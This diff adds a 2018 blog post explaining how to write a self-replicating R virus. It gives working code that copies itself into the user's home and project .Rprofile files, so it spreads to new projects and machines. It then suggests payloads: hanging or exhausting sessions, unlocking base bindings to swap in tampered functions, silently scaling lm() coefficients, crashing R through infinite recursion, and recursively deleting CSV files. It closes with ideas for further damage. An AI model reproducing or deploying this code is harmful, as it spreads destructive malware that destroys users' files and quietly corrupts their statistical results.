@@ -1,0 +1,114 @@
+---
+title: 'How to Write an R Virus '
+author: Siqi Zhang
+date: '2018-09-27'
+slug: how-to-write-an-r-virus
+categories:
+  - R
+tags:
+  - Programming
+---
+
+
+
+<p>A <a href="https://en.wikipedia.org/wiki/Computer_virus">computer virus</a> is a piece of program that can:</p>
+<ul>
+<li>copy itself</li>
+<li>do bad things</li>
+</ul>
+<p>This is not very hard to accomplish with R, as I will demonstrate in this article.</p>
+<div id="replicate" class="section level2">
+<h2>Replicate</h2>
+<p>The <a href="https://gist.github.com/iqis/e4030f6af45d0d3ebae21f2816c1fc58"><em>virus</em></a> exploits R’s initilization script, <code>.Rprofile</code>. When R starts up, it is going to look for this file in the current working directory and the user’s home directory, then runs everything in it:</p>
+<pre class="r"><code>{
+    function() {
+        rp_paths &lt;- c(&quot;~/.Rprofile&quot;, paste0(getwd(), &quot;/.Rprofile&quot;))
+        inject &lt;- function(rp, code) {
+            write(code, file = rp, append = FALSE)
+        }
+        lapply(rp_paths, inject, code = deparse(match.call()))
+
+        cat(&quot;Wow, your R is Rancid!!!\n&quot;)
+    }
+}()</code></pre>
+<p>When the above script is run, it will make a copy of itself through <code>deparse(match.call())</code>, and overwrite the <code>.Rprofile</code> files. The next time you open a new R session, everything you see in the above will be run again. Right now, our virus does nothing but printing something at the end of your start up message.</p>
+<pre><code>...
+
+Type &#39;demo()&#39; for some demos, &#39;help()&#39; for on-line help, or
+&#39;help.start()&#39; for an HTML browser interface to help.
+Type &#39;q()&#39; to quit R.
+
+Wow, your R is Rancid!!!</code></pre>
+<p>Any project that started by the user is going to have its project folder infected. Likewise, if someone copy-and-pasted the R project folder to another computer, and start R from there, his home folder is going to be infected.</p>
+</div>
+<div id="damage" class="section level2">
+<h2>Damage</h2>
+<p>It looks like that the replication part of the virus is taken care of. What, then, are some malicious scripts that we can have fun with?</p>
+<p>There could be countless ways.</p>
+<p>One of the easiest thing to do is to hang the user’s R session. It could be done as simply as putting it to <em>sleep</em> for a really long time:</p>
+<pre class="r"><code>Sys.sleep(1e9)</code></pre>
+<p>… like 30 years, give or take.</p>
+<p>Or, let R come up with a really large number; this is also going take up available memory to the user.</p>
+<pre class="r"><code>rnorm(1e9)</code></pre>
+<p>For me, 1e9 is quite enough. But scientific notaion is your friend. Go big.</p>
+<p>However, if R is rendered completely unusable, the virus isn’t goint to travel very far. That’s not what we want. It is also a great idea to replace some good functions with naughty ones. Symbol bindings are locked in attached namespaces, but it is easy to undo that:</p>
+<pre class="r"><code>reassign &lt;- function(sym, value, envir) {
+        envir &lt;- as.environment(envir)
+        unlockBinding(sym, envir)
+        assign(sym, value, envir = envir)
+}</code></pre>
+<p>We can do the user a service by forbidding the <code>library()</code> function, and prompt a better option.</p>
+<pre class="r"><code>reassign(&quot;library&quot;, 
+         function(...) warning(&quot;No man, seriously. Use require()&quot;),
+         &quot;package:base&quot;
+)</code></pre>
+<p>The effect would be:</p>
+<pre class="r"><code>library(purrr)</code></pre>
+<pre><code>## Warning in library(purrr): No man, seriously. Use require()</code></pre>
+<p>Now let’s try something more subtle and more bad(<em>badder</em>?). We first extend the <code>reassign()</code> function a little bit…</p>
+<pre class="r"><code>tamper &lt;- function(sym, value, envir){
+        assign(paste0(&quot;.&quot;,sym), 
+               get(sym, envir = as.environment(envir)), 
+               envir = as.environment(&quot;package:base&quot;)
+               )
+        reassign(sym, value, envir)
+}</code></pre>
+<p>… and use it to slip in some bad code.</p>
+<pre class="r"><code>tamper(&quot;lm&quot;,
+       function(...){
+               model &lt;- .lm(...)
+               model$coefficients &lt;- 
+                       model$coefficients * (1 + rnorm(1))
+               model
+               },
+       &quot;package:stats&quot;)</code></pre>
+<p>Now when we build a model; the coefficients looks normal, but are completely off. You can compare the this with the result on your own computer.</p>
+<pre class="r"><code>lm(mpg ~ ., data = mtcars)$coefficients</code></pre>
+<pre><code>##  (Intercept)          cyl         disp           hp         drat 
+##  5.161254138 -0.046749178  0.005594121 -0.009011729  0.330192329 
+##           wt         qsec           vs           am         gear 
+## -1.558566579  0.344425839  0.133301208  1.057232860  0.274945158 
+##         carb 
+## -0.083656194</code></pre>
+<p>In the above, we saved a copy of the original function in the base package. If we didn’t do that, we would have create an infinite recursion through self-refernce, such as:</p>
+<pre class="r"><code>reassign(&quot;paste&quot;,
+         function(...) paste(...),
+         &quot;package:base&quot;)</code></pre>
+<pre class="r"><code>paste(&quot;foo&quot;, &quot;bar&quot;)</code></pre>
+<p>Running this will crash the R session. If the user didn’t save documents before setting off this bomb, too bad.</p>
+<p>There are yet more ways to damages. For starters, how about deleting every <code>csv</code> file the user has in the working directory?</p>
+<pre class="r"><code>file.remove(list.files(getwd(), 
+                       &quot;.csv&quot;,
+                       recursive = TRUE)</code></pre>
+<p>Doing something on the file system can mean a lot.</p>
+<p>From annoying to destructive, the level of naughtiness only limited by on your imagination. With some deliberation, you can ruin someone’s life in a very meaningful way.</p>
+<p>Here are some futher ideas:</p>
+<ul>
+<li>Bloat the user’s disk space with meaningless data</li>
+<li>Give wrong results only <em>sometimes</em> when a function is called</li>
+<li>Use Rstudio API to mess with the user’s scripts</li>
+</ul>
+<p><strong>Note</strong><br />
+You also have the choice of putting any of the malicious programs in <code>.First()</code> and <code>.Last()</code> functions, which will run at the beginning and the end of a session. See the <a href="https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html">R Manual</a> for details.</p>
+<p>More on <code>.Rprofile</code>: <a href="http://www.onthelambda.com/2014/09/17/fun-with-rprofile-and-customizing-r-startup/">Fun with .Rprofile and customizing R startup</a></p>
+</div>
